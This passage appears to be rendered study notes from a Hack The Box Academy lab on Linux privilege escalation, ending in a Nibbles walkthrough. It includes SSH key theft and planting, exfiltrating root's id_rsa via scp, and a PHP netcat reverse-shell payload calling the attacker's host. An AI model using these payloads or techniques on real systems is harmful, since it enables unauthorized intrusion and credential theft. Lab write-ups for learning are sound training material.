+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">712</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">13</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>php
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">396</span><span class="w"> </span>Dec<span class="w">  </span><span class="m">5</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>sysstat
+</pre></div>
+</div>
+<p>if we can write a dir called by a cron job, then we can write a bash with rev shell</p>
+</section>
+<section id="exposed-credentials">
+<h4><span class="section-number">1.7.1.2.6. </span>exposed credentials<a class="headerlink" href="#exposed-credentials" title="Link to this heading">#</a></h4>
+<p>garbage divers<br />
+check config, logs and histories for exposed credentials<br />
+use enum scripts</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>...SNIP...
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Searching<span class="w"> </span>passwords<span class="w"> </span><span class="k">in</span><span class="w"> </span>config<span class="w"> </span>PHP<span class="w"> </span>files
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Finding<span class="w"> </span>passwords<span class="w"> </span>inside<span class="w"> </span>logs<span class="w"> </span><span class="o">(</span>limit<span class="w"> </span><span class="m">70</span><span class="o">)</span>
+...SNIP...
+/var/www/html/config.php:<span class="w"> </span><span class="nv">$conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>mysqli<span class="o">(</span>localhost,<span class="w"> </span><span class="s1">&#39;db_user&#39;</span>,<span class="w"> </span><span class="s1">&#39;password123&#39;</span><span class="o">)</span><span class="p">;</span>
+</pre></div>
+</div>
+</section>
+<section id="ssh-keys">
+<h4><span class="section-number">1.7.1.2.7. </span>ssh keys<a class="headerlink" href="#ssh-keys" title="Link to this heading">#</a></h4>
+<section id="use-their-key">
+<h5><span class="section-number">1.7.1.2.7.1. </span>use their key<a class="headerlink" href="#use-their-key" title="Link to this heading">#</a></h5>
+<p>read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server<br />
+need <code class="docutils literal notranslate"><span class="pre">read</span> <span class="pre">priv</span></code><br />
+after the id_rsa is sent to ur local machine save it as a file</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>vim<span class="w"> </span>id_rsa
+</pre></div>
+</div>
+<p>give it the correct prem</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>id_rsa
+
+r<span class="w"> </span>-&gt;<span class="w"> </span><span class="m">4</span>
+w<span class="w"> </span>-&gt;<span class="w"> </span><span class="m">2</span>
+x<span class="w"> </span>-&gt;<span class="w"> </span><span class="m">1</span>
+first<span class="w"> </span>digi:<span class="w"> </span>user
+sec<span class="w"> </span>digi:<span class="w"> </span>group
+third<span class="w"> </span>digi:<span class="w"> </span>others
+
+<span class="m">600</span>:<span class="w"> </span>usr<span class="o">(</span>r<span class="w"> </span>+<span class="w"> </span>w<span class="o">)</span><span class="p">;</span>group<span class="w"> </span>and<span class="w"> </span>others<span class="w"> </span>none
+
+
+ssh<span class="w"> </span>user@10.10.10.10<span class="w"> </span>-i<span class="w"> </span>id_rsa
+</pre></div>
+</div>
+<p>if the prem is overly premissive, the sever may ban it from working</p>
+</section>
+<section id="add-our-key">
+<h5><span class="section-number">1.7.1.2.7.2. </span>add our key<a class="headerlink" href="#add-our-key" title="Link to this heading">#</a></h5>
+<p>if we have write priv to /.ssh/ dir, we will place our public key in the authorized_keys dir<br />
+/home/user/.ssh/authorized_keys</p>
+<p>shell access -&gt; ssh access<br />
+we must already gained control over the user</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>FallenOverlord&#64;htb[/htb]$ ssh-keygen -f key</p>
+<p>Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): *******
+Enter same passphrase again: *******</p>
+<p>Your identification has been saved in key
+Your public key has been saved in key.pub
+The key fingerprint is:
+SHA256:…SNIP… user&#64;parrot
+The key’s randomart image is:
++—[RSA 3072]—-+
+|   ..o.++.+      |
+…SNIP…
+|     . ..oo+.    |
++—-[SHA256]—–+</p>
+</div>
+<p>the ssh-keygen command generates a new key, the -f command specific the output file<br />
+This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>user@remotehost$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ssh-rsa AAAAB...SNIP...M= user@parrot&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/root/.ssh/authorized_keys
+
+FallenOverlord@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>ssh<span class="w"> </span>root@10.10.10.10<span class="w"> </span>-i<span class="w"> </span>key
+</pre></div>
+</div>
+</section>
+</section>
+<section id="priv-esc-box">
+<h4><span class="section-number">1.7.1.2.8. </span>priv esc box<a class="headerlink" href="#priv-esc-box" title="Link to this heading">#</a></h4>
+<section id="horizontal-movement">
+<h5><span class="section-number">1.7.1.2.8.1. </span>horizontal movement<a class="headerlink" href="#horizontal-movement" title="Link to this heading">#</a></h5>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>User<span class="w"> </span>user1<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on
+<span class="w">        </span>ng-1136328-gettingstartedprivesc-kmo8e-b88b89484-jvjss:
+<span class="w">    </span><span class="o">(</span>user2<span class="w"> </span>:<span class="w"> </span>user2<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/bin/bash
+
+FallenOverlord@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>sudo<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>/bin/bash
+user2@ng-1136328-gettingstartedprivesc-kmo8e-b88b89484-jvjss:~$<span class="w"> </span>whoami
+user2
+user2@ng-1136328-gettingstartedprivesc-kmo8e-b88b89484-jvjss:~$<span class="w"> </span>ls
+flag.txt
+user2@ng-1136328-gettingstartedprivesc-kmo8e-b88b89484-jvjss:~$<span class="w"> </span>cat<span class="w"> </span>flag.txt<span class="w"> </span>
+HTB<span class="o">{</span>l473r4l_m0v3m3n7_70_4n07h3r_u53r<span class="o">}</span>
+</pre></div>
+</div>
+</section>
+<section id="priv-esc-to-root">
+<h5><span class="section-number">1.7.1.2.8.2. </span>priv esc to root<a class="headerlink" href="#priv-esc-to-root" title="Link to this heading">#</a></h5>
+<p>before heading into the question, i know i have the bash access for user2, but not the root access.</p>
+<p>spam</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Check if the file exists and your permissions on it</span>
+ls<span class="w"> </span>-l<span class="w"> </span>/home/user/.ssh/id_rsa
+ls<span class="w"> </span>-l<span class="w"> </span>/root/.ssh/id_rsa
+
+<span class="c1"># Try to read the file</span>
+cat<span class="w"> </span>/home/user/.ssh/id_rsa
+cat<span class="w"> </span>/root/.ssh/id_rsa
+
+scp<span class="w"> </span>-P<span class="w"> </span><span class="m">36803</span><span class="w"> </span>user1@83.136.253.251:/root/.ssh/id_rsa<span class="w"> </span>/home/
+</pre></div>
+</div>
+<p>now i see that i can read the id_rsa file in the root folder, so i can ssh into the target machine using the private keys provided in the id_rsa file.<br />
+copy all the content when cating the id_rsa file.<br />
+use exit command twice to go back to local machine and make a file to stored the now exfiltrated root’s private key.<br />
+once that is sorted out, we want to ssh into the root account on the target machine.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>┌─<span class="o">[</span>us-academy-2<span class="o">]</span>─<span class="o">[</span><span class="m">10</span>.10.14.34<span class="o">]</span>─<span class="o">[</span>htb-ac-1136328@htb-jctqq3hoo2<span class="o">]</span>─<span class="o">[</span>~<span class="o">]</span>
+└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>find<span class="w"> </span>~/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;id_rsa_2&quot;</span>
+/home/htb-ac-1136328/id_rsa_2
+
+┌─<span class="o">[</span>us-academy-2<span class="o">]</span>─<span class="o">[</span><span class="m">10</span>.10.14.34<span class="o">]</span>─<span class="o">[</span>htb-ac-1136328@htb-jctqq3hoo2<span class="o">]</span>─<span class="o">[</span>~<span class="o">]</span>
+└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>ssh<span class="w"> </span>-i<span class="w"> </span>/home/htb-ac-1136328/id_rsa_2<span class="w"> </span>root@94.237.56.188<span class="w"> </span>-p<span class="w"> </span><span class="m">32627</span>
+</pre></div>
+</div>
+<p>the first command is to locate the place i strored the id_rsa file in my local machine.</p>
+</section>
+</section>
+</section>
+<section id="transferring-files">
+<h3><span class="section-number">1.7.1.3. </span>Transferring files<a class="headerlink" href="#transferring-files" title="Link to this heading">#</a></h3>
+<p>transfer files between remote server and target machine<br />
+msfconsole meterpreter shell: upload</p>
+<section id="wget">
+<h4><span class="section-number">1.7.1.3.1. </span>wget<a class="headerlink" href="#wget" title="Link to this heading">#</a></h4>
+<p>first make a py server on the machine that contains the file</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8000</span>
+</pre></div>
+</div>
+<p>to check the ip address on the server is running on</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ip<span class="w"> </span>addr<span class="w"> </span>show
+
+ip<span class="w"> </span>a
+
+ifconfig
+
+
+<span class="m">192</span>.168.119.128
+┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span>ip<span class="w"> </span>a<span class="w">        </span>
+<span class="m">1</span>:<span class="w"> </span>lo:<span class="w"> </span>&lt;LOOPBACK,UP,LOWER_UP&gt;<span class="w"> </span>mtu<span class="w"> </span><span class="m">65536</span><span class="w"> </span>qdisc<span class="w"> </span>noqueue<span class="w"> </span>state<span class="w"> </span>UNKNOWN<span class="w"> </span>group<span class="w"> </span>default<span class="w"> </span>qlen<span class="w"> </span><span class="m">1000</span>
+<span class="w">    </span>link/loopback<span class="w"> </span><span class="m">00</span>:00:00:00:00:00<span class="w"> </span>brd<span class="w"> </span><span class="m">00</span>:00:00:00:00:00
+<span class="w">    </span>inet<span class="w"> </span><span class="m">127</span>.0.0.1/8<span class="w"> </span>scope<span class="w"> </span>host<span class="w"> </span>lo
+<span class="w">       </span>valid_lft<span class="w"> </span>forever<span class="w"> </span>preferred_lft<span class="w"> </span>forever
+<span class="w">    </span>inet6<span class="w"> </span>::1/128<span class="w"> </span>scope<span class="w"> </span>host<span class="w"> </span>
+<span class="w">       </span>valid_lft<span class="w"> </span>forever<span class="w"> </span>preferred_lft<span class="w"> </span>forever
+<span class="m">2</span>:<span class="w"> </span>eth0:<span class="w"> </span>&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;<span class="w"> </span>mtu<span class="w"> </span><span class="m">1500</span><span class="w"> </span>qdisc<span class="w"> </span>fq_codel<span class="w"> </span>state<span class="w"> </span>UP<span class="w"> </span>group<span class="w"> </span>default<span class="w"> </span>qlen<span class="w"> </span><span class="m">1000</span>
+<span class="w">    </span>link/ether<span class="w"> </span><span class="m">00</span>:0c:29:d2:08:42<span class="w"> </span>brd<span class="w"> </span>ff:ff:ff:ff:ff:ff
+<span class="w">    </span>inet<span class="w"> </span><span class="m">192</span>.168.119.128/24<span class="w"> </span>brd<span class="w"> </span><span class="m">192</span>.168.119.255<span class="w"> </span>scope<span class="w"> </span>global<span class="w"> </span>dynamic<span class="w"> </span>noprefixroute<span class="w"> </span>eth0
+<span class="w">       </span>valid_lft<span class="w"> </span>1508sec<span class="w"> </span>preferred_lft<span class="w"> </span>1508sec
+<span class="w">    </span>inet6<span class="w"> </span>fe80::a501:da0d:d9a2:f090/64<span class="w"> </span>scope<span class="w"> </span>link<span class="w"> </span>noprefixroute<span class="w"> </span>
+<span class="w">       </span>valid_lft<span class="w"> </span>forever<span class="w"> </span>preferred_lft<span class="w"> </span>forever
+</pre></div>
+</div>
+<p>on the machine that we want to download the file</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>user@remotehost$<span class="w"> </span>wget<span class="w"> </span>http://10.10.14.1:8000/linenum.sh
+
+
+user@remotehost$<span class="w"> </span>curl<span class="w"> </span>http://10.10.14.1:8000/linenum.sh<span class="w"> </span>-o<span class="w"> </span>linenum.sh
+<span class="c1">#the -o linenum.sh renames the file after downloading</span>
+</pre></div>
+</div>
+<p>in the last challenge, when i found out that the ip_rsa file on the target machine is readable, i could transfer the ip_rsa file back to my local machine so that i can ssh as root</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>scp<span class="w"> </span>linenum.sh<span class="w"> </span>user@remotehost:/tmp/lineum.sh
+</pre></div>
+</div>
+</section>
+</section>
+<section id="nibbles">
+<h3><span class="section-number">1.7.1.4. </span>Nibbles<a class="headerlink" href="#nibbles" title="Link to this heading">#</a></h3>
+<p>common enumeration tactics, basic web application exploitation, and a file-related misconfiguration to escalate privileges</p>
+<p>IP  10.10.10.75
+OS  Linux
+AV  web app</p>
+<ol class="arabic simple">
+<li><p>bashic enum
+look for open ports:<br />
+<code class="docutils literal notranslate"><span class="pre">nmap</span> <span class="pre">-sV</span> <span class="pre">--open</span> <span class="pre">-oA</span> <span class="pre">nibbles_initial_scan</span> <span class="pre">10.129.42.190</span></code><br />
+this will also save the scan results in 3 formats.<br />
+Banner grabbing, double check
+<code class="docutils literal notranslate"><span class="pre">nc</span> <span class="pre">-nv</span> <span class="pre">10.129.42.190</span> <span class="pre">22</span></code></p></li>
+</ol>
+<section id="web-footprinting">
+<h4><span class="section-number">1.7.1.4.1. </span>web footprinting<a class="headerlink" href="#web-footprinting" title="Link to this heading">#</a></h4>
+<p>identify the web app</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>whatweb<span class="w"> </span><span class="m">10</span>.129.42.190
+
+┌─<span class="o">[</span>us-academy-2<span class="o">]</span>─<span class="o">[</span><span class="m">10</span>.10.14.36<span class="o">]</span>─<span class="o">[</span>htb-ac-1136328@htb-yuecbl5gje<span class="o">]</span>─<span class="o">[</span>~<span class="o">]</span>
+└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>whatweb<span class="w"> </span><span class="m">10</span>.129.141.152
+http://10.129.141.152<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="w"> </span>OK<span class="o">]</span><span class="w"> </span>Apache<span class="o">[</span><span class="m">2</span>.4.18<span class="o">]</span>,<span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTTPServer<span class="o">[</span>Ubuntu<span class="w"> </span>Linux<span class="o">][</span>Apache/2.4.18<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.129.141.152<span class="o">]</span>
+</pre></div>
+</div>
+<p>Next, check the page’s source code.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>http://10.129.42.190
+</pre></div>
+</div>
+<p>Try to find hidden directories, for example</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>whatweb<span class="w"> </span>http://10.129.42.190/nibbleblog
+
+FallenOverlord@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>whatweb<span class="w"> </span>http://10.129.42.190/nibbleblog
+
+http://10.129.42.190/nibbleblog<span class="w"> </span><span class="o">[</span><span class="m">301</span><span class="w"> </span>Moved<span class="w"> </span>Permanently<span class="o">]</span><span class="w"> </span>Apache<span class="o">[</span><span class="m">2</span>.4.18<span class="o">]</span>,<span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTTPServer<span class="o">[</span>Ubuntu<span class="w"> </span>Linux<span class="o">][</span>Apache/2.4.18<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.129.42.190<span class="o">]</span>,<span class="w"> </span>RedirectLocation<span class="o">[</span>http://10.129.42.190/nibbleblog/<span class="o">]</span>,<span class="w"> </span>Title<span class="o">[</span><span class="m">301</span><span class="w"> </span>Moved<span class="w"> </span>Permanently<span class="o">]</span>
+http://10.129.42.190/nibbleblog/<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="w"> </span>OK<span class="o">]</span><span class="w"> </span>Apache<span class="o">[</span><span class="m">2</span>.4.18<span class="o">]</span>,<span class="w"> </span>Cookies<span class="o">[</span>PHPSESSID<span class="o">]</span>,<span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTML5,<span class="w"> </span>HTTPServer<span class="o">[</span>Ubuntu<span class="w"> </span>Linux<span class="o">][</span>Apache/2.4.18<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.129.42.190<span class="o">]</span>,<span class="w"> </span>JQuery,<span class="w"> </span>MetaGenerator<span class="o">[</span>Nibbleblog<span class="o">]</span>,<span class="w"> </span>PoweredBy<span class="o">[</span>Nibbleblog<span class="o">]</span>,<span class="w"> </span>Script,<span class="w"> </span>Title<span class="o">[</span>Nibbles<span class="w"> </span>-<span class="w"> </span>Yum<span class="w"> </span>yum<span class="o">]</span>
+</pre></div>
+</div>
+<section id="dir-enum">
+<h5><span class="section-number">1.7.1.4.1.1. </span>Dir Enum<a class="headerlink" href="#dir-enum" title="Link to this heading">#</a></h5>
+<p>check for accessable pages and hidden dir, use gobuster</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>FallenOverlord@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.129.42.190/nibbleblog/<span class="w"> </span>--wordlist<span class="w"> </span>/usr/share/dirb/wordlists/common.txt
+
+<span class="o">===============================================================</span>
+
+Gobuster<span class="w"> </span>v3.0.1
+
+by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">            </span>http://10.129.42.190/nibbleblog/
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">        </span><span class="m">10</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">       </span>/usr/share/dirb/wordlists/common.txt
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Status<span class="w"> </span>codes:<span class="w">   </span><span class="m">200</span>,204,301,302,307,401,403
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">     </span>gobuster/3.0.1
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">        </span><span class="nv">10s</span>
+<span class="o">===============================================================</span>
+<span class="m">2020</span>/12/17<span class="w"> </span><span class="m">00</span>:10:47<span class="w"> </span>Starting<span class="w"> </span><span class="nv">gobuster</span>
+<span class="o">===============================================================</span>
+/.hta<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span>
+/.htaccess<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span>
+/.htpasswd<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span>
+/admin<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span>
+/admin.php<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span>
+/content<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span>
+/index.php<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span>
+/languages<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span>
+/plugins<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span>
+/README<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span>
+/themes<span class="w"> </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="m">2020</span>/12/17<span class="w"> </span><span class="m">00</span>:11:38<span class="w"> </span><span class="nv">Finished</span>
+<span class="o">===============================================================</span>
+</pre></div>
+</div>
+<p>Do a quick google search for the vuln &amp; exploits on the dir -&gt; use msfconsole for exploits</p>
+<p>request this file with cURL and prettify the XML output using xmllint</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>FallenOverlord@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>curl<span class="w"> </span>-s<span class="w"> </span>http://10.129.42.190/nibbleblog/content/private/users.xml<span class="w"> </span><span class="p">|</span><span class="w"> </span>xmllint<span class="w">  </span>--format<span class="w"> </span>-
+
+&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span><span class="w"> </span><span class="nv">standalone</span><span class="o">=</span><span class="s2">&quot;yes&quot;</span>?&gt;
+&lt;users&gt;
+<span class="w">  </span>&lt;user<span class="w"> </span><span class="nv">username</span><span class="o">=</span><span class="s2">&quot;admin&quot;</span>&gt;
+<span class="w">    </span>&lt;id<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;integer&quot;</span>&gt;0&lt;/id&gt;
+<span class="w">    </span>&lt;session_fail_count<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;integer&quot;</span>&gt;2&lt;/session_fail_count&gt;
+<span class="w">    </span>&lt;session_date<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;integer&quot;</span>&gt;1608182184&lt;/session_date&gt;
+<span class="w">  </span>&lt;/user&gt;
+<span class="w">  </span>&lt;blacklist<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;string&quot;</span><span class="w"> </span><span class="nv">ip</span><span class="o">=</span><span class="s2">&quot;10.10.10.1&quot;</span>&gt;
+<span class="w">    </span>&lt;date<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;integer&quot;</span>&gt;1512964659&lt;/date&gt;
+<span class="w">    </span>&lt;fail_count<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;integer&quot;</span>&gt;1&lt;/fail_count&gt;
+<span class="w">  </span>&lt;/blacklist&gt;
+<span class="w">  </span>&lt;blacklist<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;string&quot;</span><span class="w"> </span><span class="nv">ip</span><span class="o">=</span><span class="s2">&quot;10.10.14.2&quot;</span>&gt;
+<span class="w">    </span>&lt;date<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;integer&quot;</span>&gt;1608182171&lt;/date&gt;
+<span class="w">    </span>&lt;fail_count<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;integer&quot;</span>&gt;5&lt;/fail_count&gt;
+<span class="w">  </span>&lt;/blacklist&gt;
+&lt;/users&gt;
+</pre></div>
+</div>
+<p>10.129.15.8
+FallenOverlord&#64;htb[/htb]$ gobuster dir -u <a class="reference external" href="http://10.129.42.190/nibbleblog/">http://10.129.42.190/nibbleblog/</a> –wordlist /usr/share/dirb/wordlists/common.txt</p>
+<p>exposed dir</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>┌─<span class="o">[</span>us-academy-2<span class="o">]</span>─<span class="o">[</span><span class="m">10</span>.10.14.36<span class="o">]</span>─<span class="o">[</span>htb-ac-1136328@htb-eqighy8yx8<span class="o">]</span>─<span class="o">[</span>~<span class="o">]</span>
+└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.129.15.8/nibbleblog<span class="w"> </span>--wordlist<span class="w"> </span>/usr/share/dirb/wordlists/common.txt
+
+/.htpasswd<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">306</span><span class="o">]</span>
+/.hta<span class="w">                 </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">301</span><span class="o">]</span>
+/.htaccess<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">306</span><span class="o">]</span>
+/admin<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">321</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.15.8/nibbleblog/admin/<span class="o">]</span>
+/admin.php<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">1401</span><span class="o">]</span><span class="w">                                          </span>
+/content<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">323</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.15.8/nibbleblog/content/<span class="o">]</span>
+/index.php<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">2987</span><span class="o">]</span><span class="w">                                            </span>
+/languages<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">325</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.129.15.8/nibbleblog/languages/<span class="o">]</span>
+</pre></div>
+</div>
+<p>user name</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>&lt;users&gt;
+&lt;user<span class="w"> </span><span class="nv">username</span><span class="o">=</span><span class="s2">&quot;admin&quot;</span>&gt;
+&lt;/user&gt;
+&lt;blacklist<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;string&quot;</span><span class="w"> </span><span class="nv">ip</span><span class="o">=</span><span class="s2">&quot;10.10.10.1&quot;</span>&gt;
+&lt;date<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;integer&quot;</span>&gt;1512964659&lt;/date&gt;
+&lt;fail_count<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;integer&quot;</span>&gt;1&lt;/fail_count&gt;
+&lt;/blacklist&gt;
+&lt;blacklist<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;string&quot;</span><span class="w"> </span><span class="nv">ip</span><span class="o">=</span><span class="s2">&quot;10.10.14.36&quot;</span>&gt;
+&lt;date<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;integer&quot;</span>&gt;1715425421&lt;/date&gt;
+&lt;fail_count<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;integer&quot;</span>&gt;1&lt;/fail_count&gt;
+&lt;/blacklist&gt;
+&lt;/users&gt;
+</pre></div>
+</div>
+<p>generate custom wordlist<br />
+prepare for hashcat</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cewl<span class="w"> </span>http://10.129.15.8/nibbleblog.com<span class="w"> </span>-m<span class="w"> </span><span class="m">5</span><span class="w"> </span>-w<span class="w"> </span>nibbleblog.txt
+</pre></div>
+</div>
+<p>password: nibbles</p>
+</section>
+</section>
+<section id="initial-foothold">
+<h4><span class="section-number">1.7.1.4.2. </span>Initial Foothold<a class="headerlink" href="#initial-foothold" title="Link to this heading">#</a></h4>
+<p>logged in adin pothal -&gt; RCE -&gt; reverse shell<br />
+test payload</p>
+<?php system('id'); ?>  
+<p>testing: activating php script<br />
+curl <a class="reference external" href="http://10.129.226.202/nibbleblog/content/private/plugins/my_image/image.php">http://10.129.226.202/nibbleblog/content/private/plugins/my_image/image.php</a></p>
+<p>bash RS payload</p>
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 9443 >/tmp/f"); ?>  
+<p>nc listener<br />
+nc -lvnp 9443</p>
+<p>make a friendlier shell<br />
+python3 -c ‘import pty; pty.spawn(“/bin/bash”)’</p>
+<p>activate reverse shell<br />
